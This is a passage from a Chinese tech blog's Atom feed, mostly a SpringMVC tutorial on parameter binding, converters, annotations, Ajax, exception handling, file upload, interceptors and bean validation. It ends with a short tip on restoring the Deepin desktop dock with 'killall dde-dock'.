title="请求参数绑定"></a>请求参数绑定</h4><p>当你以表当post提交参数时，RequestMapping可以根据HandlerMapping寻找指定controller携带的javabean类对象参数将参数封装成一个bean对象返回（jsp表单指定属性name值要与bean对象属性名相同，当参数时包装对象时，应使用包装对象里的对象名加属性）</p><pre><code class="xml">&lt;form action=&quot;params/userVoadd&quot; method=&quot;post&quot;&gt;    username&lt;input type=&quot;text&quot; name=&quot;user.username&quot;&gt;&lt;/br&gt;    password&lt;input type=&quot;password&quot; name=&quot;user.password&quot;&gt;&lt;/br&gt;    money&lt;input type=&quot;text&quot; name=&quot;user.money&quot;&gt;&lt;/br&gt;    UserVoName&lt;input type=&quot;text&quot; name=&quot;userVoname&quot;&gt;&lt;/br&gt;    UserVoPassword&lt;input type=&quot;text&quot; name=&quot;userVopassword&quot;&gt;&lt;/br&gt;    &lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;&lt;/form&gt;</code></pre><h4 id="请求时参数转换器"><a href="#请求时参数转换器" class="headerlink" title="请求时参数转换器"></a>请求时参数转换器</h4><p>（1）首先定义一个类继承<strong>Converter</strong>或者<strong>formatter</strong>类，<br>前者可用泛型表达参数转换类型&lt;String,Integer&gt;，后者使用<t>,formatter转换源类型必须是String，对于Web应用Http发送的数据都是以String类型存储，使用formatter更合适</t></p><pre><code class="java">public class Convertors implements Converter&lt;String,Date&gt; {    @Override    public Date convert(String s) {        if(s==null){            throw new RuntimeException(&quot;请你传入数据!&quot;);        }        DateFormat df=new SimpleDateFormat(&quot;yyyy-MM-dd&quot;);        try {            return df.parse(s);        } catch (ParseException e) {            throw new RuntimeException(&quot;转换出错&quot;);        }    }}</code></pre><p>（2）在主文件中配置装换器</p><pre><code class="xml">&lt;bean class=&quot;org.springframework.context.support.ConversionServiceFactoryBean&quot; id=&quot;conversionServiceFactoryBean&quot;&gt;        &lt;property name=&quot;converters&quot;&gt;            &lt;set&gt;                &lt;bean class=&quot;com.dingxiang.utils.DateConvertor.Convertors&quot;/&gt;            &lt;/set&gt;        &lt;/property&gt;    &lt;/bean&gt;</code></pre><p>（3）在注解中打开转换器</p><pre><code class="xml">&lt;mvc:annotation-driven conversion-service=&quot;conversionServiceFactoryBean&quot;/&gt;</code></pre><h3 id="常用注解"><a href="#常用注解" class="headerlink" title="常用注解"></a>常用注解</h3><h4 id="RequestParam"><a href="#RequestParam" class="headerlink" title="RequestParam"></a>RequestParam</h4><p>（1）RequestParam=request.getParameter(“name”)（name和value属性基本等同，required表示是否必须）</p><pre><code class="java">//用s来获取参数usernamepublic String testRequestParam(@RequestParam(name = &quot;username&quot;)String s){        System.out.println(s);        return &quot;start&quot;;    }</code></pre><h4 id="RequestBody"><a href="#RequestBody" class="headerlink" title="RequestBody"></a>RequestBody</h4><p>（2）RequestBody（获取请求体的内容，得到key=value&amp;keyvalue…，gei方式不适用）</p><pre><code class="java">//获取表单传递参数，用字符串接受public String testRequestBody(@RequestBody String body){        System.out.println(body);        return &quot;start&quot;;    }</code></pre><h4 id="PathVarible"><a href="#PathVarible" class="headerlink" title="PathVarible"></a>PathVarible</h4><p>（3）PathVariable使用RESTful风格，即根据参数传递类型和参数数量选取不同的方法执行，</p><pre><code class="java">//使用占位符{}直接传入参数@RequestMapping(&quot;/testPathVariable/{id}&quot;)    public String testPathVariable(@PathVariable(value = &quot;id&quot;) String body){        System.out.println(body);        return &quot;start&quot;;    }</code></pre><h4 id="静态方法发送请求"><a href="#静态方法发送请求" class="headerlink" title="静态方法发送请求"></a>静态方法发送请求</h4><p>浏览器插件测试各种请求方式<br>（4）RequestHeader（少用）</p><pre><code class="java">@RequestHeader(value = &quot;User-Agent&quot;)</code></pre><p>（5）CookieValue（少用）</p><pre><code class="java">@CookieValue(value = &quot;JSESSIONID&quot;)</code></pre><h4 id="ModelAttribute"><a href="#ModelAttribute" class="headerlink" title="ModelAttribute"></a>ModelAttribute</h4><p>（6）ModelAttribute（方法、参数）首先执行<br>用于将多个参数封装到一个实体对象，从而简化数据绑定流程，自动暴露为模型数据，在视图展示时使用<br>两种方法，返回bean对象或者通过把bean对象加入到集合使用注解来读取</p><pre><code class="java"> @RequestMapping(&quot;/testModelAttribute&quot;)    public String testModelAttribute(@ModelAttribute(&quot;1&quot;) User user){        System.out.println(&quot;testModelAttribute&quot;);        System.out.println(user.toString());        return &quot;start&quot;;    }    @ModelAttribute    public void modelattribute(Map&lt;String,User&gt; map){        User user=new User();        user.setDate(new Date());        user.setMoney(12.212);        map.put(&quot;1&quot;,user);    }</code></pre><pre><code class="java">@RequestMapping(&quot;/testModelAttribute&quot;)    public String testModelAttribute(User user){        System.out.println(&quot;testModelAttribute&quot;);        System.out.println(user.toString());        return &quot;start&quot;;    }    @ModelAttribute    public User modelattribute(){        User user=new User();        user.setDate(new Date());        user.setMoney(12.212);        return user;    }</code></pre><h4 id="SessionAttribute"><a href="#SessionAttribute" class="headerlink" title="SessionAttribute"></a>SessionAttribute</h4><p>（7）SessionAttribute<br>使用HttpSession的话需要servletAPI支持，存在耦合<br>value代表我们需要把什么样的对象放入session</p><pre><code class="java">@SessionAttributes(value = {&quot;name&quot;})</code></pre><h4 id="前端控制器拦截资源文件"><a href="#前端控制器拦截资源文件" class="headerlink" title="前端控制器拦截资源文件"></a>前端控制器拦截资源文件</h4><p>（8）不让前端控制器拦截资源文件<br>    <code>&lt;mvc:resources mapping=&quot;/css/**&quot; location=&quot;/css/**&quot;/&gt;</code></p><h4 id="ResponseBody"><a href="#ResponseBody" class="headerlink" title="ResponseBody"></a>ResponseBody</h4><p>（9）ResponseBody 使用到了json转换器jackson，添加maven依赖<br>核心包：jackson-databind jackson-annatation jackson-core</p><pre><code class="xml">    &lt;dependency&gt;      &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;      &lt;artifactId&gt;jackson-core&lt;/artifactId&gt;      &lt;version&gt;2.8.1&lt;/version&gt;    &lt;/dependency&gt;    &lt;dependency&gt;      &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;      &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;      &lt;version&gt;2.8.1&lt;/version&gt;    &lt;/dependency&gt;    &lt;dependency&gt;      &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;      &lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt;      &lt;version&gt;2.8.1&lt;/version&gt;    &lt;/dependency&gt;</code></pre><h3 id="Ajax前后端数据传输"><a href="#Ajax前后端数据传输" class="headerlink" title="Ajax前后端数据传输"></a>Ajax前后端数据传输</h3><p> <strong>jQuery Ajax实现前后台json数据传输并使用@RequestBody封装成对象传输到后台@ResponseBody封装成对象返回到jsp</strong></p><pre><code class="js">$(function () {            $(&#39;#ajax&#39;).click(function () {                $.ajax({                    url:&#39;user/testAjax2&#39;,                    contentType:&#39;application/json; charset=UTF-8&#39;,                    type:&#39;post&#39;,                    data:&#39;{&quot;username&quot;:&quot;zoufuob&quot;,&quot;password&quot;:&quot;12345&quot;}&#39;,                    dataType:&#39;json&#39;,                    error:function () {                        alert(&quot;获取数据失败&quot;)                    },                    success:function (data) {                        alert(data.username)                        alert(data.password)                    }                })            })        })</code></pre><pre><code class="java">//jackson把json String封装发哦user对象@RequestMapping(&quot;/testAjax2&quot;)    public @ResponseBody User testAjax2(@RequestBody User user){        System.out.println(&quot;执行了testAjax2&quot;);        System.out.println(user);        //模拟查找修改数据库数据        user.setUsername(&quot;wangdatao&quot;);        user.setPassword(&quot;52zoufubo&quot;);        return user;    }</code></pre><h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><ul><li>（1）异常类  继承Exception</li><li>（2）异常解析类 实现接口HandlerExceptionResolver重写resolveException方法</li></ul><pre><code class="java">public ModelAndView resolveException(javax.servlet.http.HttpServletRequest httpServletRequest, javax.servlet.http.HttpServletResponse httpServletResponse, Object o, Exception e) {        //获取异常对象        SysException exception=null;        if(e instanceof SysException){            exception= (SysException) e;        }else{            exception = new SysException(&quot;error&quot;);        }        //创建modelandview        ModelAndView modelAndView=new ModelAndView();        modelAndView.addObject(&quot;errorMsg&quot;,exception.getMsg());        modelAndView.setViewName(&quot;error&quot;);        return modelAndView;    }</code></pre><ul><li>（3）配置异常处理器（配置异常解析类对象到spring）</li></ul><p><img src="https://img-blog.csdnimg.cn/20190522230615681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NzYwMzMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><blockquote><p>表单 enctype=”multipart/form-data”</p></blockquote><h4 id="单服务器文件上传"><a href="#单服务器文件上传" class="headerlink" title="单服务器文件上传"></a>单服务器文件上传</h4><p>用MultipartFile对象作为Controller参数接收表单传入数据，通过transferTo方法上传文件</p><pre><code class="java">public String testUpload2(HttpServletRequest request, MultipartFile upload2)throws Exception{        System.out.println(&quot;文件上传&quot;);        String path=request.getSession().getServletContext().getRealPath(&quot;/uploads/&quot;);        File file=new File(path);        if(!file.exists()){            file.mkdir();        }        String name=upload2.getOriginalFilename();        String uuid=UUID.randomUUID().toString().replace(&quot;-&quot;,&quot;&quot;);        name=uuid+&quot;_&quot;+name;        upload2.transferTo(new File(path,name));        return &quot;success&quot;;    }</code></pre><h4 id="跨服务器上传文件"><a href="#跨服务器上传文件" class="headerlink" title="跨服务器上传文件"></a>跨服务器上传文件</h4><ul><li>（1）创建客户端对象</li><li>（2）与服务器建立连接</li><li>（3）传入数据</li></ul><pre><code class="java">@RequestMapping(&quot;testUpload3&quot;)    public String testUpload3(MultipartFile upload3) throws IOException {        System.out.println(&quot;跨服务器文件上传&quot;);        String path=&quot;http://localhost:8090/uploads/&quot;;        String name=upload3.getOriginalFilename();        String uuid=UUID.randomUUID().toString().replace(&quot;-&quot;,&quot;&quot;);        name=uuid+&quot;_&quot;+name;        //创建客户端对象        Client client=Client.create();        //与服务器进行连接        WebResource resource=client.resource(path+name);        //传文件        resource.put(upload3.getBytes());        return &quot;success&quot;;    }</code></pre><h3 id="拦截器"><a href="#拦截器" class="headerlink" title="拦截器"></a>拦截器</h3><p>功能与过滤器基本相同，但是拦截器只能对用户请求的方法进行拦截，用在权限验证，判断用户是否登录，记录请求信息的日志</p><ul><li>拦截器类 实现接口HandlerInterceptor 可重写<ul><li>preHandle（返回true时执行下一个拦截器，没有拦截器时执行Controller）</li><li>postHandle（该方法在控制器请求方法调用之后，视图解析之前进行执行）</li><li>afterHandle（在视图解析后执行）</li></ul></li><li>配置拦截器</li></ul><pre><code class="xml">&lt;mvc:interceptors&gt;        &lt;mvc:interceptor&gt;            &lt;!--要拦截的方法--&gt;            &lt;mvc:mapping path=&quot;/user/testInterceptor&quot;/&gt;            &lt;bean class=&quot;com.dingxiang.Interceptor.MyInterceptor&quot; id=&quot;myInterceptor&quot;/&gt;        &lt;/mvc:interceptor&gt;        &lt;mvc:interceptor&gt;            &lt;!--要拦截的方法--&gt;            &lt;mvc:mapping path=&quot;/user/testInterceptor&quot;/&gt;            &lt;bean class=&quot;com.dingxiang.Interceptor.MyInterceptor2&quot; id=&quot;myInterceptor2&quot;/&gt;        &lt;/mvc:interceptor&gt;        &lt;mvc:interceptor&gt;            &lt;mvc:mapping path=&quot;/login/main&quot;/&gt;            &lt;bean class=&quot;com.dingxiang.Interceptor.loginInterceptor.LoginInterceptor&quot; id=&quot;loginInterceptor&quot;/&gt;        &lt;/mvc:interceptor&gt;    &lt;/mvc:interceptors&gt;</code></pre><h3 id="数据验证"><a href="#数据验证" class="headerlink" title="数据验证"></a>数据验证</h3><p>网页前端验证后还需要在服务器端对数据进行验证</p><h4 id="Spring-Validator接口"><a href="#Spring-Validator接口" class="headerlink" title="Spring Validator接口"></a>Spring Validator接口</h4><p>首先需要编写一个Vaidator类实现该接口，对数据进行验证的配置，相当于JSR303的注解配置验证信息；<br>然后再主配置文件中配置一个ReloadableResourceBundleMessageSource Bean并打开注解validator</p><pre><code class="xml">&lt;bean class=&quot;org.springframework.context.support.ReloadableResourceBundleMessageSource&quot; id=&quot;messageSource&quot;&gt;        &lt;property name=&quot;basename&quot; value=&quot;classpath:errorMessege&quot;/&gt;    &lt;/bean&gt;</code></pre><pre><code class="xml">&lt;mvc:annotation-driven validator=&quot;validator&quot;/&gt;</code></pre><h4 id="JSR303-JSR-303"><a href="#JSR303-JSR-303" class="headerlink" title="JSR303 JSR-303"></a>JSR303 JSR-303</h4><p> Java EE 6 中的一项子规范，叫做 Bean Validation JSR 303 用于对 Java Bean 中的字段的值进行验证。</p><ol><li><p>Bean Validation 中内置的 constraint</p><ul><li>@Null<br>被注释的元素必须为 null</li><li>@NotNull<br>被注释的元素必须不为 null</li><li>@AssertTrue<br>被注释的元素必须为 true</li><li>@AssertFalse<br>被注释的元素必须为 false</li><li>@Min(value)<br>被注释的元素必须是一个数字，其值必须大于等于指定的最小值</li><li>@Max(value)<br>被注释的元素必须是一个数字，其值必须小于等于指定的最大值</li><li>@DecimalMin(value)<br>被注释的元素必须是一个数字，其值必须大于等于指定的最小值</li><li>@DecimalMax(value)<br>被注释的元素必须是一个数字，其值必须小于等于指定的最大值</li><li>@Size(max, min)<br>被注释的元素的大小必须在指定的范围内</li><li>@Digits (integer, fraction)<br>被注释的元素必须是一个数字，其值必须在可接受的范围内</li><li>@Past<br>被注释的元素必须是一个过去的日期</li><li>@Future<br>被注释的元素必须是一个将来的日期</li><li>@Pattern(value)<br>被注释的元素必须符合指定的正则表达式</li></ul></li><li><p>Hibernate Validator 附加的 constraint</p><ul><li>@Email<br>被注释的元素必须是电子邮箱地址</li><li>@Length<br>被注释的字符串的大小必须在指定的范围内</li><li>@NotEmpty<br>被注释的字符串的必须非空</li><li>@Range<br>被注释的元素必须在合适的范围内</li></ul></li></ol><p>与Validator不同的是需要配置一个LocalValidatorFactoryBean</p><pre><code class="xml"> &lt;bean id=&quot;validator&quot; class=&quot;org.springframework.validation.beanvalidation.LocalValidatorFactoryBean&quot;&gt;        &lt;property name=&quot;providerClass&quot; value=&quot;org.hibernate.validator.HibernateValidator&quot;/&gt;        &lt;property name=&quot;validationMessageSource&quot; ref=&quot;messageSource&quot;/&gt;    &lt;/bean&gt;</code></pre>]]></content>
    
    <summary type="html">
    
      SpringMVC：一种基于Java实现的MVC设计模型的请求驱动类型的轻量级框架- M（model）：javaBean对象（将参数封装成JavaBean对象交给业务层处理）
    
    </summary>
    
      <category term="Java Web" scheme="https://www.dzou.top/categories/Java-Web/"/>
    
    
      <category term="Java" scheme="https://www.dzou.top/tags/Java/"/>
    
      <category term="Web" scheme="https://www.dzou.top/tags/Web/"/>
    
      <category term="后端" scheme="https://www.dzou.top/tags/%E5%90%8E%E7%AB%AF/"/>
    
      <category term="Spring" scheme="https://www.dzou.top/tags/Spring/"/>
    
      <category term="SpringMVC" scheme="https://www.dzou.top/tags/SpringMVC/"/>
    
      <category term="SSM" scheme="https://www.dzou.top/tags/SSM/"/>
    
  </entry>
  
  <entry>
    <title>解决Deepin系统使用中dock栏消失不显示</title>
    <link href="https://www.dzou.top/post/3a5de41c.html"/>
    <id>https://www.dzou.top/post/3a5de41c.html</id>
    <published>2019-07-23T12:38:32.000Z</published>
    <updated>2019-08-02T11:47:09.969Z</updated>
    
    <content type="html"><![CDATA[<h2 id="解决Deepin系统使用中dock栏消失不显示"><a href="#解决Deepin系统使用中dock栏消失不显示" class="headerlink" title="解决Deepin系统使用中dock栏消失不显示"></a>解决Deepin系统使用中dock栏消失不显示</h2><p>不需要卸载重新安装<strong>dde-dock</strong></p><p>只需要把进程kill</p><p>终端中输入：</p><pre><code class="linux">killall dde-dock</code></pre><p>dock栏就出现了</p>]]></content>
    
    <summary type="html">
    
      解决Deepin系统使用中dock栏消失不显示
    
    </summary>
    
      <category term="linux" scheme="https://www.dzou.top/categories/linux/"/>
    
    
      <category term="deepin" scheme="https://www.dzou.top/tags/deepin/"/>
    
      <category term="linux" scheme="https://www.dzou.top/tags/linux/"/>
    
  </entry>
  
</feed>
